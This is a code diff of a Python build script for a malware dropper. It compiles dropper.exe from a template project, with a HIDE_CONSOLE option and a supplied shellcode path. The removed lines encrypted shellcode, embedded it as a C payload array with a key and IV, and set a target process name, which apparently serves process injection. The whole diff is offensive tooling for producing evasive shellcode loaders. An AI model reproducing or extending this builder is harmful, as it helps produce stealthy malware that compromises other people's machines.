@@ -4,8 +4,7 @@ import tempfile
 import shutil
 
 from datetime import datetime
-from .shellcode_generator import generate_shellcode
-from .config_setup import setup_config_header
+from .header_generator import fill_config_header
 
 
 DROPPER_CORE_PATH = '../dropper_core/'
@@ -62,17 +61,6 @@ def set_makefile_source_files(source_path):
 
     replace_placeholders(os.path.join(source_path, "Makefile"), {"/* SOURCE_FILES */": formatted_sources})    
 
-def format_shellcode(shellcode: str):
-    shellcode_list = shellcode.split(", ")
-    formatted_shellcode = "unsigned char Payload[] = {\n\t"
-    
-    for i in range(0, len(shellcode_list), 24):
-        line = ", ".join(byte for byte in shellcode_list[i:i+24])
-        formatted_shellcode += line + ",\n\t"
-    formatted_shellcode = formatted_shellcode.rstrip(",\n\t") + "\n};"
-
-    return formatted_shellcode
-
 def delete_file_or_directory(path: str = ""):
     """
     Deletes a file or directory at the specified path.
@@ -99,48 +87,31 @@ def delete_file_or_directory(path: str = ""):
         print(f"The path '{path}' is neither a file nor a directory.")
     
 
-def build_dropper(encryption_method: str, preprocessing_macros: dict, placeholder_options: dict):
+def build_dropper(dropper_config: dict):
     """Builds a dropper by copying project files, generating shellcode, replacing placeholders, and running Makefile."""
     print('🔨 Compiling Dropper...')
-    
+
     # Extract known parameters with default values
-    out_filename = placeholder_options.get("out_filename")
-    shellcode_path = placeholder_options.get("shellcode_path")
-    
+    out_filename = dropper_config.get("out_filename")
+    shellcode_path = dropper_config.get("shellcode_path")
+
     # Step 1: Copy the project to a temporary directory
     temp_dir = copy_project_to_temp()
 
-    # Step 2: Generate obfuscated shellcode
-    shellcode, enc_key, iv = generate_shellcode(placeholder_options['shellcode'], algorithm=encryption_method.split('_')[0].lower())
-    
-    # Step 3: Replace placeholders in dropper.c
-    placehodlers = {"/* SHELLCODE */": format_shellcode(shellcode)}
-    if enc_key:
-        placehodlers["/* KEY */"] = f"unsigned char key [] = {{\n\t{enc_key}\n}};"
-    if iv:
-        placehodlers["/* IV */"] = f"unsigned char iv [] = {{\n\t{iv}\n}};"
-    if placeholder_options.get("process_name"):
-        placehodlers["/* PROCESS_NAME */"] = f"L\"{placeholder_options.get('process_name')}\""
-    
-    dropper_source_path = os.path.join(temp_dir, "dropper.c")
-    replace_placeholders(dropper_source_path, placehodlers)    
-    
-    # Step 4: Prepare shellcode argument
-    shellcode_arg = shellcode_path if shellcode_path else placeholder_options.get('shellcode_text', '')
+    # Step 2: Fill config headers with preprocessing macros and constants
+    fill_config_header(dropper_config, temp_dir)
 
-    # Step 5: Please preprocesing macros in the file config.h
-    setup_config_header(preprocessing_macros, temp_dir)
-
-    # Step 6: Construct the Make command
+    # Step 3: Construct the Make command
     set_makefile_source_files(temp_dir)
+    hide_console = dropper_config.get('hide_console', None)
     command = ["make", "-f", "./Makefile"] + [
-        f"SHELLCODE={shellcode_arg.replace('~', 'IN')}",
-        f"OUTPUT_FILE={out_filename.replace('~', 'IN')}"
+        f"OUTPUT_FILE={out_filename}",
+        f"HIDE_CONSOLE={"true" if hide_console else "false"}",
     ]
 
     print("🔹 Running command:", " ".join(command))  # Debugging output
-    
-    # Step 7: Run the make command with error handling
+
+    # Step 4: Run the make command with error handling
     try:
         subprocess.run(command, check=True, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         print("✅ Compilation done successfully.")
@@ -150,25 +121,25 @@ def build_dropper(encryption_method: str, preprocessing_macros: dict, placeholde
         print(f"### Command:\n{command}\n")
         print(f"### stdout:\n{e.stdout}\n")
         print(f"### stderr:\n{e.stderr}\n")
-        
-    # Step 8: Move the output file to the specified output directory
+
+    # Step 5: Move the output file to the specified output directory
     src = os.path.join(temp_dir, "bin", "dropper.exe")
     dst_dir = "./dropper_outputs/"
     dst = os.path.join(dst_dir, out_filename)
-    
+
     if os.path.exists(dst):
         base, ext = os.path.splitext(out_filename)
-        new_filename = f"{base}_{datetime.now().strftime("%d_%m_%Y-%H_%M_%S")}{ext}"
+        new_filename = f"{base}_{datetime.now().strftime('%d_%m_%Y-%H_%M_%S')}{ext}"
         dst = os.path.join(dst_dir, new_filename)
-    
+
     try:
         print(src, dst)
         shutil.move(src, dst)
         print("✅ Output file moved successfully.")
     except Exception as e:
         print(f"❌ Failed to move output file: {e}")
-        
-    # Step 9: Clean up the temporary directory
+
+    # Step 6: Clean up the temporary directory
     if shellcode_path:
         delete_file_or_directory(shellcode_path)
-    delete_file_or_directory(temp_dir)
+    #delete_file_or_directory(temp_dir)
